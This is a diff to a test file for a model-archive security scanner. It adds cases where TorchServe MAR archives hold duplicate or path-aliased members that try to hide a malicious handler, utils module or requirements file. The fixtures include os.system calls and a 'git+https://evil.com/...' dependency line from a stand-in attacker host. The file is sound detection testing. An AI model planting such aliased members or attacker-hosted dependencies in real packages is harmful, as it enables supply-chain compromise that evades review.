@@ -6,6 +6,7 @@ import ast
 import json
 import pickle
 import zipfile
+from collections.abc import Mapping, Sequence
 from pathlib import Path
 from typing import Any, cast
 
@@ -20,7 +21,7 @@ from modelaudit.scanners.zip_scanner import ZipScanner
 def _create_mar_archive(
     tmp_path: Path,
     manifest: dict[str, Any] | str | None,
-    entries: dict[str, bytes],
+    entries: Mapping[str, bytes] | Sequence[tuple[str, bytes]],
     filename: str = "model.mar",
     compression: int = zipfile.ZIP_STORED,
 ) -> Path:
@@ -36,7 +37,8 @@ def _create_mar_archive(
             )
             archive.writestr("MAR-INF/MANIFEST.json", manifest_bytes)
 
-        for name, data in entries.items():
+        archive_entries = entries.items() if isinstance(entries, Mapping) else entries
+        for name, data in archive_entries:
             archive.writestr(name, data)
 
     return mar_path
@@ -108,6 +110,46 @@ def test_scan_benign_mar_with_safe_handler(tmp_path: Path) -> None:
     result = TorchServeMarScanner().scan(str(mar_path))
     handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
     assert len(handler_failures) == 0
+
+
+def test_scan_flags_duplicate_handler_member_even_when_benign_copy_is_last(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries=[
+            ("handler.py", b"import os\n\ndef handle(data, context):\n    return os.system('echo owned')\n"),
+            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
+            ("weights.bin", b"weights"),
+        ],
+        filename="duplicate_handler_override.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
+
+    assert len(handler_failures) == 1
+    assert "os.system" in handler_failures[0].message
+    assert handler_failures[0].details["handler"] == "handler.py"
+
+
+def test_scan_accepts_clean_duplicate_handler_members(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries=[
+            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
+            ("handler.py", b"def handle(data, context):\n    return {'still_ok': True}\n"),
+            ("weights.bin", b"weights"),
+        ],
+        filename="duplicate_handler_clean.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
+
+    assert handler_failures == []
 
 
 def test_non_handler_python_analysis_clean_handler_and_utils_has_no_failures(tmp_path: Path) -> None:
@@ -195,6 +237,50 @@ def test_non_handler_python_analysis_detects_malicious_utils_module(tmp_path: Pa
         check.severity == IssueSeverity.WARNING and "high-risk calls: os.system" in check.message
         for check in non_handler_failures
     )
+
+
+def test_non_handler_python_analysis_flags_duplicate_module_even_when_benign_copy_is_last(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries=[
+            ("handler.py", b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n"),
+            ("utils.py", b"import os\n\ndef transform(data):\n    return os.system('echo owned')\n"),
+            ("utils.py", b"def transform(data):\n    return {'ok': True, 'data': data}\n"),
+            ("weights.bin", b"weights"),
+        ],
+        filename="duplicate_utils_override.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
+
+    assert len(non_handler_failures) >= 1
+    assert any(
+        failure.details.get("member") == "utils.py" and "high-risk calls: os.system" in failure.message
+        for failure in non_handler_failures
+    )
+
+
+def test_non_handler_python_analysis_accepts_clean_duplicate_modules(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries=[
+            ("handler.py", b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n"),
+            ("utils.py", b"def transform(data):\n    return {'ok': True, 'data': data}\n"),
+            ("utils.py", b"def transform(data):\n    return {'still_ok': True, 'data': data}\n"),
+            ("weights.bin", b"weights"),
+        ],
+        filename="duplicate_utils_clean.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
+
+    assert non_handler_failures == []
 
 
 def test_non_handler_python_analysis_parses_each_helper_module_once(
@@ -979,6 +1065,75 @@ def test_scan_accepts_clean_requirements_txt(tmp_path: Path) -> None:
     assert requirements_checks[0].status == CheckStatus.PASSED
 
 
+def test_scan_flags_colliding_requirements_txt_member_even_when_benign_alias_is_last(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries=[
+            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
+            ("weights.bin", b"weights"),
+            ("requirements.txt", b"git+https://evil.com/repo#egg=evilpkg\n"),
+            ("subdir/../requirements.txt", b"numpy==1.26.4\n"),
+        ],
+        filename="requirements_collision_override.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert any(
+        finding["reason"] == "git_install" and finding["requirements_file"] == "requirements.txt"
+        for finding in requirements_failures[0].details.get("findings", [])
+    )
+
+
+def test_core_scan_keeps_colliding_requirements_alias_findings_flat(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries=[
+            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
+            ("weights.bin", b"weights"),
+            ("requirements.txt", b"git+https://evil.com/repo#egg=evilpkg\n"),
+            ("subdir/../requirements.txt", b"numpy==1.26.4\n"),
+        ],
+        filename="requirements_collision_core_flat.mar",
+    )
+
+    result = core.scan_file(str(mar_path))
+    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
+    failed_checks = [check for check in requirements_checks if check.status == CheckStatus.FAILED]
+
+    assert len(requirements_checks) == 2
+    assert len(failed_checks) == 1
+    assert failed_checks[0].details["zip_entry"] == "requirements.txt"
+    assert all("reason" in finding for finding in failed_checks[0].details.get("findings", []))
+
+
+def test_scan_accepts_clean_colliding_requirements_txt_aliases(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries=[
+            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
+            ("weights.bin", b"weights"),
+            ("requirements.txt", b"numpy==1.26.4\n"),
+            ("subdir/../requirements.txt", b"torch==2.2.2\n"),
+        ],
+        filename="requirements_collision_clean.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_checks) == 2
+    assert all(check.status == CheckStatus.PASSED for check in requirements_checks)
+
+
 def test_scan_ignores_inline_comment_urls_in_safe_requirements(tmp_path: Path) -> None:
     manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
     mar_path = _create_mar_archive(
@@ -1067,6 +1222,80 @@ def test_scan_analyzes_local_included_requirements_files(tmp_path: Path) -> None
         finding["reason"] == "non_pypi_index_url" and finding["requirements_file"] == "extra.txt"
         for finding in requirements_failures[0].details.get("findings", [])
     )
+
+
+def test_scan_flags_colliding_local_requirements_include_even_when_benign_alias_is_last(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries=[
+            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
+            ("weights.bin", b"weights"),
+            ("requirements.txt", b"-r extra.txt\n"),
+            ("extra.txt", b"git+https://evil.com/repo#egg=evilpkg\n"),
+            ("subdir/../extra.txt", b"numpy==1.26.4\n"),
+        ],
+        filename="requirements_local_include_collision_override.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert any(
+        finding["reason"] == "git_install" and finding["requirements_file"] == "extra.txt"
+        for finding in requirements_failures[0].details.get("findings", [])
+    )
+
+
+def test_scan_follows_local_requirements_include_beyond_entry_processing_cap(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries=[
+            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
+            ("weights.bin", b"weights"),
+            ("requirements.txt", b"-r extra.txt\n"),
+            ("extra.txt", b"git+https://evil.com/repo#egg=evilpkg\n"),
+        ],
+        filename="requirements_include_after_entry_cap.mar",
+    )
+
+    result = TorchServeMarScanner(config={"max_mar_entries": 4}).scan(str(mar_path))
+
+    entry_limit_failures = _failed_checks(result, "TorchServe MAR Entry Limit")
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(entry_limit_failures) == 1
+    assert len(requirements_failures) == 1
+    assert any(
+        finding["reason"] == "git_install" and finding["requirements_file"] == "extra.txt"
+        for finding in requirements_failures[0].details.get("findings", [])
+    )
+
+
+def test_scan_accepts_clean_colliding_local_requirements_include_aliases(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries=[
+            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
+            ("weights.bin", b"weights"),
+            ("requirements.txt", b"-r extra.txt\n"),
+            ("extra.txt", b"numpy==1.26.4\n"),
+            ("subdir/../extra.txt", b"torch==2.2.2\n"),
+        ],
+        filename="requirements_local_include_collision_clean.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_checks) == 1
+    assert requirements_checks[0].status == CheckStatus.PASSED
 
 
 @pytest.mark.parametrize(
